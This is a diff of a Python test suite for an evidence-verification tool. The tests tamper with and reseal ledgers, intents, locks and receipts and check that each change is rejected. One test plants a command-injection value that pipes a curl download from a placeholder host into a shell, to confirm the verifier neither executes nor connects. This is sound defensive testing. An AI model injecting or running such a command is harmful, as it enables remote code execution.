-            **{key: value for key, value in job.items() if key != "weight"},
-            "protocol_sha256": protocol_sha256,
-            "phase": "PHASE_7",
-            "argv": ["synthetic-p12-placeholder", job["object_id"]],
-            "cwd_identity": "synthetic-p12-root-no-access",
-            "environment_sha256": canonical_sha256({"p12": "synthetic-env"}),
-            "input_sha256": sorted(
-                {
-                    canonical_sha256({"p12": job["job_id"]}),
-                    python_validity["artifact_sha256"],
-                }
-            ),
-            "seed": None,
-            "timeout_seconds": 30,
-            "attempt": 1,
-        }
-        result_record = {
-            "job_id": job["job_id"],
-            "attempt": 1,
-            "status": "PASS",
-            "exit_code": 0,
-            "stdout_sha256": canonical_sha256({"p12": job["job_id"], "stdout": 1}),
-            "stderr_sha256": canonical_sha256({"p12": job["job_id"], "stderr": 1}),
-            "duration_seconds": 0.01,
-            "failure_code": "",
-            "scientific_outcome": outcome,
-            "call_trace_sha256": None,
-            "call_trace_identity": None,
-        }
-        attempt_root = evidence_root / f"jobs/PHASE_7/{job['job_id']}/1"
-        create_intent(attempt_root, intent)
-        write_result(attempt_root, result_record)
-        jobs["PHASE_7"].append(job["job_id"])
-        terminal_pairs.append({"intent": intent, "result": result_record})
-        result_rows.append({"job_id": job["job_id"], "scientific_outcome": outcome})
+    retry_job_id = min(
+        intent["job_id"]
+        for intent in authority["base_intents"]
+        if intent["phase"] == "PHASE_5"
+    )
+    for base_intent in authority["base_intents"]:
+        phase = base_intent["phase"]
+        job_id = base_intent["job_id"]
+        jobs[phase].append(job_id)
+        attempt_count = 2 if job_id == retry_job_id else 1
+        for attempt in range(1, attempt_count + 1):
+            intent = {**base_intent, "attempt": attempt}
+            failed_retry = job_id == retry_job_id and attempt == 1
+            outcome = outcomes[intent["object_id"]] if phase == "PHASE_7" else None
+            result_record = {
+                "job_id": job_id,
+                "attempt": attempt,
+                "status": "FAIL_INFRASTRUCTURE" if failed_retry else "PASS",
+                "exit_code": 75 if failed_retry else 0,
+                "stdout_sha256": canonical_sha256(
+                    {"job_id": job_id, "attempt": attempt, "stream": "stdout"}
+                ),
+                "stderr_sha256": canonical_sha256(
+                    {"job_id": job_id, "attempt": attempt, "stream": "stderr"}
+                ),
+                "duration_seconds": 0.01,
+                "failure_code": "SYNTHETIC_RETRY" if failed_retry else "",
+                "scientific_outcome": outcome,
+                "call_trace_sha256": None,
+                "call_trace_identity": None,
+            }
+            attempt_root = evidence_root / f"jobs/{phase}/{job_id}/{attempt}"
+            create_intent(attempt_root, intent)
+            write_result(attempt_root, result_record)
+            if phase == "PHASE_7":
+                terminal_pairs.append({"intent": intent, "result": result_record})
+                result_rows.append(
+                    {"job_id": job_id, "scientific_outcome": outcome}
+                )
+    result_rows.sort(key=lambda row: row["job_id"])
+    terminal_pairs.sort(key=lambda pair: pair["intent"]["job_id"])
     p12_summary = recompute_p12_summary(denominator, terminal_pairs)
     p12_refs = {}
     p12_paths = {}
@@ -1046,10 +1376,8 @@ def _build_complete_evidence(tmp_path: Path) -> dict:
         _write_json(expected_path, sorted(jobs[phase]))
         if phase == "PHASE_0":
             output_body = {
-                "schema_version": "p3-synthetic-origin-receipt-v1",
-                "repository_identity": preflight_receipt["repository_identity"],
-                "origin_transport": preflight_receipt["origin_transport"],
-                "origin_sha256": preflight_receipt["origin_sha256"],
+                "schema_version": "p3-synthetic-phase-output-v1",
+                "phase": phase,
                 "synthetic_only": True,
             }
         elif phase == "PHASE_7":
@@ -1093,19 +1421,77 @@ def _build_complete_evidence(tmp_path: Path) -> dict:
         )
 
     claims = _blocked_claim_ledger(
-        "authority-rq_spec_sha256.bin",
-        "authority-claim_ceiling_sha256.bin",
+        authorities["artifacts"]["rq_spec_sha256"].relative_to(
+            evidence_root
+        ).as_posix(),
+        authorities["artifacts"]["claim_ceiling_sha256"].relative_to(
+            evidence_root
+        ).as_posix(),
         "protocol.json",
     )
     claims_path = evidence_root / "claims.json"
     _write_json(claims_path, claims)
 
+    preflight = authority["lock"]["preflight"]
+    event_body = {
+        "schema_version": "P3_V3_PREFLIGHT_EVENT_V1",
+        **{
+            field: preflight[field]
+            for field in (
+                "normalized_repository_identity",
+                "base_commit",
+                "base_tree",
+                "dependency_lock_sha256",
+                "environment_policy_sha256",
+            )
+        },
+        "capability_results": [
+            {
+                "capability": capability,
+                "status": "PASS",
+                "observation_sha256": canonical_sha256(
+                    {"capability": capability, "synthetic": True}
+                ),
+            }
+            for capability in preflight["required_capabilities"]
+        ],
+    }
+    preflight_event = {
+        **event_body,
+        "event_sha256": canonical_sha256(event_body),
+    }
+    preflight_event_path = evidence_root / "preflight-event.json"
+    _write_json(preflight_event_path, preflight_event)
+    origin_receipt = evidence_module.reconstruct_origin_receipt(
+        preflight, preflight_event
+    )
+    origin_receipt_path = evidence_root / "origin-receipt.json"
+    _write_json(origin_receipt_path, origin_receipt)
+
     for cache in evidence_root.rglob("__pycache__"):
         shutil.rmtree(cache)
 
     index_body = {
-        "schema_version": "P3_V3_EVIDENCE_INDEX_V1",
+        "schema_version": "P3_V3_EVIDENCE_INDEX_V3",
         "phase_coverage": list(PHASES),
+        "controller_source": {
+            "root": controller_source.relative_to(evidence_root).as_posix(),
+            "manifest": _indexed_reference(
+                evidence_root, controller_manifest_path
+            ),
+        },
+        "subject_sources": [
+            {
+                "subject_id": subject_id,
+                "root": materialized_roots[subject_id]
+                .relative_to(evidence_root)
+                .as_posix(),
+                "manifest": _indexed_reference(
+                    evidence_root, subject_manifest_paths[subject_id]
+                ),
+            }
+            for subject_id in ("cmake-ctest-m", "python-pep517-s")
+        ],
         "protocol": _indexed_reference(evidence_root, protocol_path),
         "protocol_artifacts": {
             field: _indexed_reference(evidence_root, authorities["artifacts"][field])
@@ -1123,6 +1509,10 @@ def _build_complete_evidence(tmp_path: Path) -> dict:
         "job_root": "jobs",
         "ledger": _indexed_reference(evidence_root, ledger_path),
         "phase_receipts": phase_receipts,
+        "preflight_event": _indexed_reference(
+            evidence_root, preflight_event_path
+        ),
+        "origin_receipt": _indexed_reference(evidence_root, origin_receipt_path),
         "p12": p12_refs,
         "claims": _indexed_reference(evidence_root, claims_path),
     }
@@ -1133,8 +1523,8 @@ def _build_complete_evidence(tmp_path: Path) -> dict:
         "index_path": index_path,
         "phase_outputs": phase_output_paths,
         "materials": materials,
-        "preflight_root": p12_repo,
-        "preflight_spec": preflight_spec_path,
+        "authority": authority,
+        "retry_job_id": retry_job_id,
     }
 
 
@@ -1212,86 +1602,64 @@ def _refresh_indexed_phase_receipt(root: Path, index: dict, phase: str) -> None:
     ).hexdigest()
 
 
-def _reconstruct_completion_metadata(fixture: dict, payload: dict) -> dict:
-    root = fixture["root"]
-    index = read_canonical_json(fixture["index_path"])
-    claims = read_canonical_json(root / index["claims"]["path"])
-    statuses = {claim["status"] for claim in claims["claims"]}
-    ecosystems = sorted(
-        {
-            read_canonical_json(root / subject["build_descriptor"]["path"])[
-                "ecosystem"
-            ]
-            for subject in index["subjects"]
-        }
+def _reseal_ledger_artifact(
+    root: Path,
+    index: dict,
+    *,
+    phase: str,
+    job_id: str,
+    attempt: int,
+    event_type: str,
+    artifact_sha256: str,
+) -> None:
+    ledger_path = root / index["ledger"]["path"]
+    events = [json.loads(line) for line in ledger_path.read_text().splitlines()]
+    event = next(
+        item
+        for item in events
+        if item["phase"] == phase
+        and item["job_id"] == job_id
+        and item["attempt"] == attempt
+        and item["kind"] == event_type
     )
-    scale_classes = sorted(
-        {
-            read_canonical_json(root / subject["source_scale"]["path"])[
-                "scale_class"
-            ]
-            for subject in index["subjects"]
-        }
-    )
-    intents = [
-        read_canonical_json(path)
-        for path in (root / index["job_root"]).rglob("intent.json")
-    ]
-    real_p12_access = any(
-        intent["job_role"] == "P12"
-        and intent["cwd_identity"] != "synthetic-p12-root-no-access"
-        for intent in intents
-    )
-    real_scientific_jobs = sum(
-        1
-        for intent in intents
-        if intent["job_role"] in {"PRIMARY_CONTROLLED", "P12", "CONTRACT_SENSITIVITY"}
-        and not intent["cwd_identity"].startswith("synthetic-")
-    )
-    body = {
-        "schema_version": "p3-synthetic-completion-v1",
-        "claims_status": statuses.pop() if len(statuses) == 1 else "mixed",
-        "real_p12_access": real_p12_access,
-        "real_scientific_jobs": real_scientific_jobs,
-        "subject_count": payload["verified_subject_count"],
-        "ecosystem_count": len(ecosystems),
-        "ecosystems": ecosystems,
-        "scale_classes": scale_classes,
-        "infrastructure_only": not real_p12_access and real_scientific_jobs == 0,
-    }
-    return _self_hashed(body)
+    event["artifact_sha256"] = artifact_sha256
+    events = _rehash_ledger_events(events)
+    ledger_path.write_bytes(b"".join(canonical_json_bytes(item) for item in events))
+    index["ledger"]["sha256"] = hashlib.sha256(ledger_path.read_bytes()).hexdigest()
 
 
-def _run_complete_verification(fixture: dict) -> tuple[subprocess.CompletedProcess, str | None]:
-    evidence_result = _cli("verify-evidence", "--index", str(fixture["index_path"]))
-    if evidence_result.returncode != 0:
-        return evidence_result, json.loads(evidence_result.stderr)["code"]
-    preflight_output = fixture["root"].parent / "reverified-preflight.json"
-    preflight_result = _cli(
-        "run-preflight",
-        "--root",
-        str(fixture["preflight_root"]),
-        "--spec",
-        str(fixture["preflight_spec"]),
-        "--output",
-        str(preflight_output),
+def _reseal_all_phase_receipts(root: Path, index: dict) -> None:
+    for phase in PHASES:
+        _refresh_indexed_phase_receipt(root, index, phase)
+
+
+def _run_complete_verification(
+    fixture: dict,
+    *,
+    index_path: Path | None = None,
+    lock_path: Path | None = None,
+    literal_lock_sha256: str | None = None,
+) -> tuple[subprocess.CompletedProcess, str | None]:
+    authority = fixture["authority"]
+    evidence_result = _cli(
+        "verify-evidence",
+        "--index",
+        str(index_path or fixture["index_path"]),
+        "--authority-lock",
+        str(lock_path or authority["lock_path"]),
+        "--authority-lock-sha256",
+        literal_lock_sha256 or authority["literal_lock_sha256"],
     )
-    if preflight_result.returncode != 0:
-        return evidence_result, json.loads(preflight_result.stderr)["code"]
-    regenerated = read_canonical_json(preflight_output)
-    declared_origin = read_canonical_json(fixture["phase_outputs"]["PHASE_0"])
-    origin_fields = ("repository_identity", "origin_transport", "origin_sha256")
-    if any(declared_origin[field] != regenerated[field] for field in origin_fields):
-        return evidence_result, "E_PREFLIGHT_RECEIPT_RECONSTRUCTION"
-    payload = json.loads(evidence_result.stdout)
-    declared_completion = read_canonical_json(fixture["phase_outputs"]["PHASE_7"])
-    if declared_completion != _reconstruct_completion_metadata(fixture, payload):
-        return evidence_result, "E_COMPLETION_METADATA_RECONSTRUCTION"
-    return evidence_result, None
+    observed = (
+        None
+        if evidence_result.returncode == 0
+        else json.loads(evidence_result.stderr)["code"]
+    )
+    return evidence_result, observed
 
 
 MUTATION_ERRORS = {
-    "adapter_byte": "E_INDEXED_SUBJECT_REDERIVATION",
+    "adapter_byte": "E_AUTHORITY_MANIFEST",
     "adapter_output": "E_INDEXED_SUBJECT_REDERIVATION",
     "source_scale": "E_INDEXED_SUBJECT_REDERIVATION",
     "schema": "E_INDEXED_SUBJECT_REDERIVATION",
@@ -1300,10 +1668,10 @@ MUTATION_ERRORS = {
     "fallback_order": "E_INDEXED_SUBJECT_REDERIVATION",
     "technique_label": "E_INDEXED_SUBJECT_REDERIVATION",
     "site": "E_INDEXED_SUBJECT_REDERIVATION",
-    "retry_argv": "E_RETRY_IDENTITY",
-    "retry_seed": "E_RETRY_IDENTITY",
-    "event": "E_LEDGER_RECONSTRUCTION",
-    "ledger": "E_LEDGER_RECONSTRUCTION",
+    "retry_argv": "E_AUTHORITY_INTENT",
+    "retry_seed": "E_AUTHORITY_INTENT",
+    "event": "E_AUTHORITY_INTENT",
+    "ledger": "E_AUTHORITY_INTENT",
     "receipt": "E_PHASE_RECEIPT",
     "package_byte": "E_PACKAGE_SHA256",
     "slot_coordinate": "E_SLOT_COORDINATE",
@@ -1313,8 +1681,6 @@ MUTATION_ERRORS = {
     "p12_summary": "E_P12_SUMMARY",
     "claim_status": "E_CLAIM_STATUS",
     "index_membership": "E_INDEX_UNINDEXED",
-    "origin_receipt": "E_PREFLIGHT_RECEIPT_RECONSTRUCTION",
-    "completion_metadata": "E_COMPLETION_METADATA_RECONSTRUCTION",
 }
 
 
@@ -1329,9 +1695,9 @@ def _mutate_complete_evidence(fixture: dict, mutation: str) -> None:
         registry_path = root / registry_ref["path"]
         registry = read_canonical_json(registry_path)
         adapter = registry["adapters"][0]
-        implementation = registry_path.parent / adapter["implementation_path"]
-        implementation.write_bytes(implementation.read_bytes() + b"\n# rehashed mutation\n")
-        adapter["source_sha256"] = hashlib.sha256(implementation.read_bytes()).hexdigest()
+        adapter["source_sha256"] = canonical_sha256(
+            {"rehashed-adapter-source": adapter["source_sha256"]}
+        )
         _refresh_self_hash(registry)
         registry_path.write_bytes(canonical_json_bytes(registry))
         registry_ref["sha256"] = hashlib.sha256(registry_path.read_bytes()).hexdigest()
@@ -1349,13 +1715,13 @@ def _mutate_complete_evidence(fixture: dict, mutation: str) -> None:
     if mutation == "adapter_output":
         ref = subject["adapter_discovery"]
         artifact = read_canonical_json(root / ref["path"])
-        artifact["declarations"][0]["entrypoint"] = "forged.module:entrypoint"
+        artifact["public_schemas"][0]["raw_schema"] = {"type": "forged"}
         _rewrite_reference(root, index, ref, artifact)
         return
     if mutation == "source_scale":
         ref = subject["source_scale"]
         artifact = read_canonical_json(root / ref["path"])
-        artifact["scale_class"] = "M"
+        artifact["scale_class"] = "S" if artifact["scale_class"] == "M" else "M"
         _rewrite_reference(root, index, ref, artifact)
         return
     if mutation == "schema":
@@ -1368,10 +1734,7 @@ def _mutate_complete_evidence(fixture: dict, mutation: str) -> None:
         ref = subject["profiling_workload"]
         artifact = read_canonical_json(root / ref["path"])
         if mutation == "workload":
-            artifact["selected_rows"] = list(reversed(artifact["selected_rows"]))
-            artifact["selected_behavior_ids"] = list(
-                reversed(artifact["selected_behavior_ids"])
-            )
+            artifact["budget"] += 1
         else:
             artifact["category_order"] = list(reversed(artifact["category_order"]))
         _rewrite_reference(root, index, ref, artifact)
@@ -1385,7 +1748,7 @@ def _mutate_complete_evidence(fixture: dict, mutation: str) -> None:
     if mutation == "technique_label":
         ref = subject["technique_profile"]
         artifact = read_canonical_json(root / ref["path"])
-        artifact["primary_technique"] = "TECH_UNCERTAIN"
+        artifact["primary_technique"] = "ARRAY_NUMERICAL"
         _rewrite_reference(root, index, ref, artifact)
         return
     if mutation == "site":
@@ -1395,7 +1758,10 @@ def _mutate_complete_evidence(fixture: dict, mutation: str) -> None:
         _rewrite_reference(root, index, ref, artifact)
         return
     if mutation in {"retry_argv", "retry_seed"}:
-        intent_path = root / "jobs/PHASE_5/infra-phase-5/2/intent.json"
+        intent_path = (
+            root
+            / f"jobs/PHASE_5/{fixture['retry_job_id']}/2/intent.json"
+        )
         intent = read_canonical_json(intent_path)
         if mutation == "retry_argv":
             intent["argv"] = ["forged-retry"]
@@ -1447,7 +1813,11 @@ def _mutate_complete_evidence(fixture: dict, mutation: str) -> None:
     if mutation == "p12_result":
         ref = index["p12"]["result_rows"]
         rows = read_canonical_json(root / ref["path"])
-        rows[0]["scientific_outcome"] = "MR_SATISFIED"
+        rows[0]["scientific_outcome"] = (
+            "MR_VIOLATION"
+            if rows[0]["scientific_outcome"] != "MR_VIOLATION"
+            else "MR_SATISFIED"
+        )
         _rewrite_reference(root, index, ref, rows)
         return
     if mutation == "p12_summary":
@@ -1467,37 +1837,6 @@ def _mutate_complete_evidence(fixture: dict, mutation: str) -> None:
         index["p12"] = {}
         _rewrite_index(index_path, index)
         return
-    if mutation == "origin_receipt":
-        entry = index["phase_receipts"][0]
-        ref = entry["output_manifest"]
-        receipt = read_canonical_json(root / ref["path"])
-        receipt["origin_sha256"] = "0" * 64
-        _rewrite_reference(root, index, ref, receipt)
-        index = read_canonical_json(index_path)
-        _refresh_indexed_phase_receipt(root, index, "PHASE_0")
-        _rewrite_index(index_path, index)
-        return
-    if mutation == "completion_metadata":
-        entry = index["phase_receipts"][-1]
-        ref = entry["output_manifest"]
-        completion = read_canonical_json(root / ref["path"])
-        completion.update(
-            {
-                "claims_status": "supported",
-                "real_p12_access": True,
-                "real_scientific_jobs": 999,
-                "subject_count": 0,
-                "ecosystem_count": 0,
-                "ecosystems": [],
-                "scale_classes": [],
-                "infrastructure_only": False,
-            }
-        )
-        _rewrite_reference(root, index, ref, completion)
-        index = read_canonical_json(index_path)
-        _refresh_indexed_phase_receipt(root, index, "PHASE_7")
-        _rewrite_index(index_path, index)
-        return
     raise AssertionError(f"unknown mutation: {mutation}")
 
 
@@ -1510,13 +1849,13 @@ def test_two_subject_phase0_to_phase7_path_is_production_verified(tmp_path):
     assert result.returncode == 0, result.stderr
     payload = json.loads(result.stdout)
     assert payload["status"] == "PASS"
-    assert payload["phase_coverage"] == PHASES
-    assert payload["verified_subject_count"] == 2
-    assert payload["manifest_count"] == 3
-    assert payload["phase_receipt_count"] == 8
-    assert payload["slot_artifact_count"] == 2
-    assert payload["verified_p12_result_count"] == 5
-    assert payload["verified_claim_count"] == 7
+    assert payload["authority_lock_sha256"] == fixture["authority"][
+        "literal_lock_sha256"
+    ]
+    assert payload["subject_count"] == 2
+    assert payload["authorized_real_p12_job_count"] == 0
+    assert payload["recorded_real_scientific_terminal_count"] == 0
+    assert payload["claims_status"] == "blocked"
     completion = read_canonical_json(fixture["phase_outputs"]["PHASE_7"])
     assert completion == _self_hashed(
         {
@@ -1543,10 +1882,355 @@ def test_rehashed_mutation_matrix_is_rejected_by_independent_reconstruction(
     result, observed_code = _run_complete_verification(fixture)
 
     assert observed_code == expected_code, (mutation, result.stdout, result.stderr)
-    if mutation not in {"origin_receipt", "completion_metadata"}:
-        assert result.returncode == 2
-        assert not result.stdout
-        assert json.loads(result.stderr) == {"code": expected_code, "status": "FAIL"}
+    assert result.returncode == 2
+    assert not result.stdout
+    assert json.loads(result.stderr) == {"code": expected_code, "status": "FAIL"}
+
+
+@pytest.mark.parametrize("reseal_completion", [False, True])
+def test_external_literal_digest_rejects_lock_reseal_before_evidence(
+    tmp_path, reseal_completion
+):
+    fixture = _build_complete_evidence(tmp_path)
+    authority = fixture["authority"]
+    lock = read_canonical_json(authority["lock_path"])
+    lock["task_id"] = "coordinated-lock-reseal"
+    authority["lock_path"].write_bytes(canonical_json_bytes(lock))
+    if reseal_completion:
+        index = read_canonical_json(fixture["index_path"])
+        phase_7 = next(
+            entry for entry in index["phase_receipts"] if entry["phase"] == "PHASE_7"
+        )
+        output = read_canonical_json(fixture["root"] / phase_7["output_manifest"]["path"])
+        output["coordinated_reseal"] = True
+        _rewrite_reference(fixture["root"], index, phase_7["output_manifest"], output)
+        index = read_canonical_json(fixture["index_path"])
+        _refresh_indexed_phase_receipt(fixture["root"], index, "PHASE_7")
+        _rewrite_index(fixture["index_path"], index)
+
+    result, observed_code = _run_complete_verification(fixture)
+
+    assert observed_code == "E_AUTHORITY_LOCK_DIGEST", result.stderr
+    assert result.returncode == 2
+    assert not result.stdout
+
+
+def test_coordinated_origin_protocol_attempt_and_completion_reseal_is_rejected(
+    tmp_path,
+):
+    fixture = _build_complete_evidence(tmp_path)
+    root = fixture["root"]
+    index = read_canonical_json(fixture["index_path"])
+    preflight_path = root / index["preflight_event"]["path"]
+    preflight = read_canonical_json(preflight_path)
+    preflight["capability_results"][0]["observation_sha256"] = "f" * 64
+    preflight["event_sha256"] = canonical_sha256(
+        {key: value for key, value in preflight.items() if key != "event_sha256"}
+    )
+    preflight_path.write_bytes(canonical_json_bytes(preflight))
+    index["preflight_event"]["sha256"] = hashlib.sha256(
+        preflight_path.read_bytes()
+    ).hexdigest()
+    origin = evidence_module.reconstruct_origin_receipt(
+        fixture["authority"]["lock"]["preflight"], preflight
+    )
+    origin_path = root / index["origin_receipt"]["path"]
+    origin_path.write_bytes(canonical_json_bytes(origin))
+    index["origin_receipt"]["sha256"] = hashlib.sha256(
+        origin_path.read_bytes()
+    ).hexdigest()
+
+    protocol_path = root / index["protocol"]["path"]
+    protocol = read_canonical_json(protocol_path)
+    protocol["infrastructure_retry_limit"] = 2
+    _refresh_self_hash(protocol)
+    protocol_path.write_bytes(canonical_json_bytes(protocol))
+    index["protocol"]["sha256"] = hashlib.sha256(
+        protocol_path.read_bytes()
+    ).hexdigest()
+    _refresh_protocol_bound_attempts(root, index)
+    phase_7 = next(
+        entry for entry in index["phase_receipts"] if entry["phase"] == "PHASE_7"
+    )
+    output_path = root / phase_7["output_manifest"]["path"]
+    output = read_canonical_json(output_path)
+    output["coordinated_reseal"] = True
+    _refresh_self_hash(output)
+    output_path.write_bytes(canonical_json_bytes(output))
+    phase_7["output_manifest"]["sha256"] = hashlib.sha256(
+        output_path.read_bytes()
+    ).hexdigest()
+    _refresh_indexed_phase_receipt(root, index, "PHASE_7")
+    _rewrite_index(fixture["index_path"], index)
+
+    result, observed_code = _run_complete_verification(fixture)
+
+    assert observed_code == "E_AUTHORITY_PROTOCOL", result.stderr
+    assert result.returncode == 2
+    assert not result.stdout
+
+
+def test_coordinated_execution_role_and_completion_relabel_is_rejected(tmp_path):
+    fixture = _build_complete_evidence(tmp_path)
+    root = fixture["root"]
+    index = read_canonical_json(fixture["index_path"])
+    intent_path = next((root / "jobs/PHASE_2").rglob("intent.json"))
+    intent = read_canonical_json(intent_path)
+    intent["job_role"] = "PROFILING"
+    intent_path.write_bytes(canonical_json_bytes(intent))
+    _reseal_ledger_artifact(
+        root,
+        index,
+        phase="PHASE_2",
+        job_id=intent["job_id"],
+        attempt=1,
+        event_type="INTENT",
+        artifact_sha256=canonical_sha256(intent),
+    )
+    _reseal_all_phase_receipts(root, index)
+    phase_7 = next(
+        entry for entry in index["phase_receipts"] if entry["phase"] == "PHASE_7"
+    )
+    output_path = root / phase_7["output_manifest"]["path"]
+    output = read_canonical_json(output_path)
+    output["real_scientific_jobs"] = 1
+    _refresh_self_hash(output)
+    output_path.write_bytes(canonical_json_bytes(output))
+    phase_7["output_manifest"]["sha256"] = hashlib.sha256(
+        output_path.read_bytes()
+    ).hexdigest()
+    _refresh_indexed_phase_receipt(root, index, "PHASE_7")
+    _rewrite_index(fixture["index_path"], index)
+
+    result, observed_code = _run_complete_verification(fixture)
+
+    assert observed_code == "E_AUTHORITY_INTENT", result.stderr
+    assert result.returncode == 2
+    assert not result.stdout
+
+
+@pytest.mark.parametrize("mutation", ["controller_omission", "subject_swap"])
+def test_repository_authority_matrix_rejects_rehashed_substitution(tmp_path, mutation):
+    fixture = _build_complete_evidence(tmp_path)
+    root = fixture["root"]
+    index = read_canonical_json(fixture["index_path"])
+    if mutation == "controller_omission":
+        manifest_ref = index["controller_source"]["manifest"]
+        manifest_path = root / manifest_ref["path"]
+        manifest = read_canonical_json(manifest_path)
+        manifest["files"].pop()
+        _refresh_self_hash(manifest)
+        manifest_path.write_bytes(canonical_json_bytes(manifest))
+        manifest_ref["sha256"] = hashlib.sha256(manifest_path.read_bytes()).hexdigest()
     else:
-        assert result.returncode == 0
-        assert json.loads(result.stdout)["status"] == "PASS"
+        index["subject_sources"].reverse()
+        index["subjects"].reverse()
+    _rewrite_index(fixture["index_path"], index)
+
+    result, observed_code = _run_complete_verification(fixture)
+
+    assert observed_code == "E_AUTHORITY_MANIFEST", (mutation, result.stderr)
+    assert result.returncode == 2
+    assert not result.stdout
+
+
+INTENT_FIELD_MUTATIONS = {
+    "job_id": "f" * 64,
+    "protocol_sha256": "e" * 64,
+    "phase": "PHASE_3",
+    "argv": ["synthetic-infrastructure", "PHASE_2", "forged"],
+    "cwd_identity": "controller-forged",
+    "environment_sha256": "d" * 64,
+    "input_sha256": ["c" * 64],
+    "seed": 2,
+    "timeout_seconds": 31,
+    "attempt": 2,
+    "object_type": "FORGED_OBJECT",
+    "object_id": "forged-object",
+    "mr_id": "forged-mr",
+    "evaluation_input_class": "E_CONTRACT",
+    "evaluation_input_id": "forged-input",
+    "repetition_id": 2,
+    "environment_id": "forged-environment",
+    "job_role": "PROFILING",
+}
+
+
+@pytest.mark.parametrize(("field", "replacement"), INTENT_FIELD_MUTATIONS.items())
+def test_every_complete_intent_field_is_externally_locked(
+    tmp_path, field, replacement
+):
+    fixture = _build_complete_evidence(tmp_path)
+    root = fixture["root"]
+    index = read_canonical_json(fixture["index_path"])
+    intent_path = next((root / "jobs/PHASE_2").rglob("intent.json"))
+    intent = read_canonical_json(intent_path)
+    original_coordinate = (intent["phase"], intent["job_id"], intent["attempt"])
+    intent[field] = replacement
+    intent_path.write_bytes(canonical_json_bytes(intent))
+    _reseal_ledger_artifact(
+        root,
+        index,
+        phase=original_coordinate[0],
+        job_id=original_coordinate[1],
+        attempt=original_coordinate[2],
+        event_type="INTENT",
+        artifact_sha256=canonical_sha256(intent),
+    )
+    _rewrite_index(fixture["index_path"], index)
+
+    result, observed_code = _run_complete_verification(fixture)
+
+    assert observed_code == "E_AUTHORITY_INTENT", (field, result.stderr)
+    assert result.returncode == 2
+    assert not result.stdout
+
+
+def test_retry_transition_is_externally_locked_after_complete_reseal(tmp_path):
+    fixture = _build_complete_evidence(tmp_path)
+    root = fixture["root"]
+    index = read_canonical_json(fixture["index_path"])
+    result_path = root / f"jobs/PHASE_5/{fixture['retry_job_id']}/1/result.json"
+    recorded = read_canonical_json(result_path)
+    recorded.update({"status": "PASS", "exit_code": 0, "failure_code": ""})
+    result_path.write_bytes(canonical_json_bytes(recorded))
+    _reseal_ledger_artifact(
+        root,
+        index,
+        phase="PHASE_5",
+        job_id=fixture["retry_job_id"],
+        attempt=1,
+        event_type="RESULT",
+        artifact_sha256=canonical_sha256(recorded),
+    )
+    _reseal_all_phase_receipts(root, index)
+    _rewrite_index(fixture["index_path"], index)
+
+    result, observed_code = _run_complete_verification(fixture)
+
+    assert observed_code == "E_AUTHORITY_INTENT", result.stderr
+    assert result.returncode == 2
+    assert not result.stdout
+
+
+@pytest.mark.parametrize(
+    ("target", "node_kind", "expected_code"),
+    [
+        ("lock", "symlink", "E_AUTHORITY_LOCK_PATH"),
+        ("lock", "fifo", "E_AUTHORITY_LOCK_PATH"),
+        ("index", "symlink", "E_INDEX_PATH"),
+        ("index", "fifo", "E_INDEX_PATH"),
+    ],
+)
+def test_authority_roots_reject_links_and_special_nodes_without_opening(
+    tmp_path, target, node_kind, expected_code
+):
+    fixture = _build_complete_evidence(tmp_path)
+    path = (
+        fixture["authority"]["lock_path"]
+        if target == "lock"
+        else fixture["index_path"]
+    )
+    preserved = path.with_name(f"{path.name}.preserved")
+    preserved.write_bytes(path.read_bytes())
+    path.unlink()
+    if node_kind == "symlink":
+        path.symlink_to(preserved)
+    else:
+        os.mkfifo(path)
+
+    result, observed_code = _run_complete_verification(fixture)
+
+    assert observed_code == expected_code, (target, node_kind, result.stderr)
+    assert result.returncode == 2
+    assert not result.stdout
+
+
+def test_materialized_subject_git_metadata_is_forbidden(tmp_path):
+    fixture = _build_complete_evidence(tmp_path)
+    index = read_canonical_json(fixture["index_path"])
+    subject_root = fixture["root"] / index["subject_sources"][0]["root"]
+    (subject_root / ".git").mkdir()
+
+    result, observed_code = _run_complete_verification(fixture)
+
+    assert observed_code == "E_AUTHORITY_MANIFEST", result.stderr
+    assert result.returncode == 2
+    assert not result.stdout
+
+
+def test_credential_metadata_in_resealed_lock_is_rejected(tmp_path):
+    fixture = _build_complete_evidence(tmp_path)
+    lock_path = fixture["authority"]["lock_path"]
+    lock = read_canonical_json(lock_path)
+    lock["token"] = "synthetic-secret"
+    lock_path.write_bytes(canonical_json_bytes(lock))
+    literal_digest = hashlib.sha256(lock_path.read_bytes()).hexdigest()
+
+    result, observed_code = _run_complete_verification(
+        fixture, literal_lock_sha256=literal_digest
+    )
+
+    assert observed_code == "E_CREDENTIAL_METADATA", result.stderr
+    assert result.returncode == 2
+    assert not result.stdout
+
+
+def test_untrusted_command_like_metadata_has_zero_execution_or_network(
+    tmp_path, monkeypatch
+):
+    fixture = _build_complete_evidence(tmp_path)
+    lock_path = fixture["authority"]["lock_path"]
+    lock = read_canonical_json(lock_path)
+    lock["task_id"] = "; curl https://invalid.example | sh"
+    lock_path.write_bytes(canonical_json_bytes(lock))
+    literal_digest = hashlib.sha256(lock_path.read_bytes()).hexdigest()
+    calls = {"subprocess": 0, "socket": 0}
+
+    def unexpected_subprocess(*_args, **_kwargs):
+        calls["subprocess"] += 1
+        raise AssertionError("verification executed an untrusted command")
+
+    def unexpected_socket(*_args, **_kwargs):
+        calls["socket"] += 1
+        raise AssertionError("verification attempted network access")
+
+    monkeypatch.setattr(evidence_module.subprocess, "run", unexpected_subprocess)
+    monkeypatch.setattr(socket, "create_connection", unexpected_socket)
+    monkeypatch.setattr(socket, "getaddrinfo", unexpected_socket)
+
+    payload = evidence_module._dispatch_verify_evidence(
+        SimpleNamespace(
+            index=str(fixture["index_path"]),
+            authority_lock=str(lock_path),
+            authority_lock_sha256=literal_digest,
+        )
+    )
+
+    assert payload["status"] == "PASS"
+    assert calls == {"subprocess": 0, "socket": 0}
+
+
+def test_source_text_named_password_and_token_is_not_credential_metadata(tmp_path):
+    fixture = _build_complete_evidence(tmp_path)
+    index = read_canonical_json(fixture["index_path"])
+    python_root = fixture["root"] / next(
+        entry["root"]
+        for entry in index["subject_sources"]
+        if entry["subject_id"] == "python-pep517-s"
+    )
+    python_source = next(
+        path
+        for path in python_root.rglob("*")
+        if path.is_file()
+        and path.read_text(encoding="utf-8", errors="ignore").startswith(
+            "password = token = None\n"
+        )
+    )
+
+    assert python_source.read_text(encoding="utf-8").startswith(
+        "password = token = None\n"
+    )
+    result, observed_code = _run_complete_verification(fixture)
+    assert observed_code is None
+    assert result.returncode == 0, result.stderr
